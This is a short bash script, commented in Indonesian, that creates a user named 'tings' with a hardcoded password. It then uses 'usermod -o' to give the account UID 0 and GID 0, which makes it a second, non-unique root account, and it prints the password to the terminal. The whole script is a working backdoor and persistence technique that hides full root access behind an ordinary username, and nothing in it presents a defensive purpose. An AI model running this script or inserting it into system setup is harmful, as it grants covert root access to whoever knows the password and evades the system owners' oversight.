#!/bin/bash

USER_NAME="tings"
PASSWORD="Tings@998"

# Mengecek apakah user sudah ada
if id "$USER_NAME" &>/dev/null; then
    echo "User $USER_NAME sudah ada. Tidak dibuat ulang."
else
    # Membuat user dengan home directory dan shell bash
    useradd -m -s /bin/bash "$USER_NAME"

    # Ubah UID dan GID ke 0 agar user setara root
    usermod -u 0 -o -g 0 "$USER_NAME"

    # Set password user
    echo "$USER_NAME:$PASSWORD" | chpasswd

    echo "Pengguna $USER_NAME berhasil dibuat dengan UID=0, GID=0, dan password $PASSWORD."
fi
